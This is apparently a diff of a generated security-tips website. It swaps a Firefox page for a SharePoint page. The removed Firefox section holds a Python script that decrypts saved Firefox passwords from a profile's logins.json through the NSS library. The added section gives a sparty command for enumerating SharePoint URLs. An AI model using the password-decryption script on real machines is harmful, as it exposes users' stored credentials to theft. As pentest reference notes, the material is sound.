@@ -7,22 +7,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="URL to test on Sharepoint websites">
+  <meta name="keywords" content="HTTP, sharepoint, web">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>
-    Firefox - Security Tips
+    SharePoint - Security Tips
     
   </title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Firefox";
-    var mkdocs_page_input_path = "firefox.md";
-    var mkdocs_page_url = "/firefox/";
+    var mkdocs_page_name = "SharePoint";
+    var mkdocs_page_input_path = "sharepoint.md";
+    var mkdocs_page_url = "/sharepoint/";
   </script>
    
 </head>
@@ -99,7 +99,7 @@
           
           <li class="bold">
             
-    <span class="section-link ">Web</span>
+    <span class="section-link active">Web</span>
     <ul>
                 <li class="">
                     
@@ -145,9 +145,14 @@
                     
     <a class="section-link" href="../spring_boot/">Spring Boot</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../sharepoint/">SharePoint</a>
+    <a class="section-link" href="./">SharePoint</a>
+    <ul>
+            
+    
+
+    </ul>
                 </li>
     </ul>
           </li>
@@ -274,24 +279,11 @@
           
           <li class="bold">
             
-    <span class="section-link active">Misc</span>
+    <span class="section-link ">Misc</span>
     <ul>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">Firefox</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#useful-addons">Useful addons</a></li>
-    
-        <li><a class="" href="#read-password-old">Read password (old)</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../firefox/">Firefox</a>
                 </li>
                 <li class="">
                     
@@ -354,81 +346,10 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="firefox">Firefox</h1>
-<h2 id="useful-addons">Useful addons</h2>
-<p>Here are good Firefox addons to install:</p>
-<ul>
-<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" target="_blank">Firefox Multi-Account Containers</a></li>
-<li><a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/" target="_blank">FoxyProxy Standard</a></li>
-<li><a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/" target="_blank">Wappalyzer</a></li>
-<li><a href="https://addons.mozilla.org/fr/firefox/addon/hackbartool/" target="_blank">HackBar</a></li>
-<li><a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/" target="_blank">User-Agent Switcher and Manager</a></li>
-<li><a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum" target="_blank">Tamper Data for FF Quantum</a></li>
-</ul>
-<h2 id="read-password-old">Read password (old)</h2>
-<pre><code class="language-python">import os
-from ctypes import Structure, CDLL
-from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte
-import json
-import base64
-
-NSSNAME = 'nss3.dll'
-FIREFOX_PATH = r'C:\Program Files\Mozilla Firefox'
-os.environ['PATH'] = &quot;;&quot;.join([os.environ['PATH'], FIREFOX_PATH])
-
-class SECItem(Structure):
-    _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]
-
-class secuPWData(Structure):
-    _fields_ = [('source', c_ubyte), ('data', c_char_p)]
-
-def get_nss_lib():
-    nsslib = os.path.join(FIREFOX_PATH, NSSNAME)
-
-    return CDLL(nsslib)
-
-def open_logins_file(folder):
-    with open(os.path.join(folder, 'logins.json')) as fd:
-        d = fd.read()
-        j = json.loads(d)
-
-    return j
-
-def read_password(folder):
-    data = open_logins_file(folder)
-    nsslib = get_nss_lib()
-    logins = data.get('logins', [])
-
-    ret_init = nsslib.NSS_Init(folder)
-    print &quot;[+] Init NSS: %s&quot; % ret_init
-
-
-    keySlot = nsslib.PK11_GetInternalKeySlot()
-    nsslib.PK11_CheckUserPassword(keySlot, '')
-    nsslib.PK11_Authenticate(keySlot, True, 0)
-
-    field = SECItem()
-    dectext = SECItem()
-
-    pwdata = secuPWData()
-    pwdata.source = 0 #PW_NONE
-    pwdata.data = 0
-
-    d = logins[0]['encryptedPassword']
-    print d
-    field.data = cast(c_char_p(base64.b64decode(d)), c_void_p)
-    field.len = len(base64.b64decode(d))
-
-    print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata))
-    print string_at(dectext.data, dectext.len)
-
-    nsslib.NSS_Shutdown()
-
-if __name__ == '__main__':
-    d = r'C:\Users\xxx\AppData\Roaming\Mozilla\Firefox\Profiles\xxx'
-    read_password(d)
-
+              <h1>Sharepoint</h1>
+              <h2 id="list-of-url">List of URL</h2>
+<p><a href="https://github.com/0xdevalias/sparty" target="_blank">sparty</a> :</p>
+<pre><code class="language-bash">python sparty_v_0.1.py -i services -u https://{HOST}/
 </code></pre>
             
           </div>
@@ -448,10 +369,10 @@ if __name__ == '__main__':
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../node/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../spring_boot/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../docker/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../postgresql/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
